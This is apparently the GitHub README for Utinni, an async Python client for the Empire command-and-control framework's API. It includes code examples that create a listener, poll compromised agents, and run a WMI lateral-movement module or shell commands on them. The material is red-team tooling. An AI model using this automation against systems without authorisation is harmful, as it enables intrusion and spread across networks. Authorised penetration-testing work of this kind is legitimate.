<p align="center">
  <img src="https://user-images.githubusercontent.com/5151193/107455866-b6778d80-6b0c-11eb-9e7d-14221e2aa582.png" alt="Utinni" height="300"/>
</p>

# Utinni

An async Python client library for Empire's RESTful API 

(Only works with the [BC-Security Empire fork](https://github.com/BC-SECURITY/Empire))

# Sponsors
[<img src="https://www.blackhillsinfosec.com/wp-content/uploads/2016/03/BHIS-logo-L-300x300.png" width="130" height="130"/>](https://www.blackhillsinfosec.com/)
[<img src="https://handbook.volkis.com.au/assets/img/Volkis_Logo_Brandpack.svg" width="130" hspace="10"/>](https://volkis.com.au)
[<img src="https://user-images.githubusercontent.com/5151193/85817125-875e0880-b743-11ea-83e9-764cd55a29c5.png" width="200" vspace="21"/>](https://qomplx.com/blog/cyber/)
[<img src="https://user-images.githubusercontent.com/5151193/86521020-9f0f4e00-be21-11ea-9256-836bc28e9d14.png" width="250" hspace="20"/>](https://ledgerops.com)
[<img src="https://user-images.githubusercontent.com/5151193/102297674-e6d7ec80-3f0c-11eb-982f-cc5d13b0e9ce.jpg" width="250" hspace="20"/>](https://www.guidepointsecurity.com/)
[<img src="https://user-images.githubusercontent.com/5151193/95542303-a27f1c00-09b2-11eb-8682-e10b3e0f0710.jpg" width="200" hspace="20"/>](https://lostrabbitlabs.com/)

# Table of Contents

* [Utinni](#utinni)
  + [Installing](#installing)
  + [Examples](#examples)
  + [FAQ](#faq)

## Installing

`pip3 install utinni`

## Examples

See the [examples](/../master/src/examples) folder for more.

Simple example showing basic usage:

```python
import asyncio
from utinni import EmpireApiClient

async def main():
    # Create client instance
    empire = EmpireApiClient(host="localhost", port="1337")

    # Login to Empire's RESTful API
    await empire.login("username", "password")
    print("* Logged into Empire")

    # Create a listener
    await empire.listeners.create(listener_type="http", name="Utinni", additional={"Port": 8443})

    print("* Waiting for agents...")
    while True:
        # Poll for new agents every 1 sec
        for agent in await empire.agents.get():

            #Print some basic info on the new agent
            print(f"+ New agent '{agent.name}' connected: {agent.domain}\\{agent.username}")

            # Execute a module on the agent
            module_output = await agent.execute(
                    "powershell/lateral_movement/invoke_wmi",
                    options={
                        "ComputerName": "targethost",
                        "Listener": "Utinni",
                    },
                )

            print(f"++ Executed invoke_wmi module on agent '{agent.name}'")
            print(f"++ Module output: {module_output}")

        await asyncio.sleep(1)

# Start the event loop
asyncio.run(main())
```

Example with background tasks:

```python
import asyncio
from utinni import EmpireApiClient

async def agent_poller(empire):
    # Poll for new agents every 1 sec
    print("* Waiting for agents...")
    while True:
        for agent in await empire.agents.get():
            #Print some basic info on the new agent
            print(f"+ New agent '{agent.name}' connected: {agent.domain}\\{agent.username}")

            # Do whatever you want with the agent object here and it won't block the main thread
            # In this example executing we're executing a shell command
            cmd_output = await agent.shell("dir")

            print("++ Executed shell command")
            print(f"++ Output: {cmd_output}")

        await asyncio.sleep(1)

async def main():
    # Create client instance
    empire = EmpireApiClient(host="localhost", port="1337")

    # Login to Empire's RESTful API
    await empire.login("username", "password")
    print("* Logged into Empire")

    # Create a listener
    await empire.listeners.create(listener_type="http", name="Utinni", additional={"Port": 8443})

    # Start the 'agent_poller' coroutine as a background task 
    agent_poller_task = asyncio.create_task(agent_poller(empire))

    # Do more stuff here as this thread isn't blocked.
    available_empire_modules = await empire.modules.get()

    # Wait for the agent_poller_task to complete
    # in this example it won't ever finish since it's in a infinite loop.
    await agent_poller_task

# Start the event loop
asyncio.run(main())
```

## FAQ

**1. Why?**

This was originally made for the [DeathStar](https://github.com/byt3bl33d3r/DeathStar) project, the author then realized it would be useful as a stand-alone library.

**2. Why doesn't this library provide a sync APIs?**

Cause it doesn't make sense. In 99% of all use cases you're going to want to call/execute/query/do multiple things at the same time. This is legitimately the perfect use case of AsyncIO.

**3. Will this work with the original Empire repository and not the BC-Security Fork?**

Probably not. You're welcome to try though.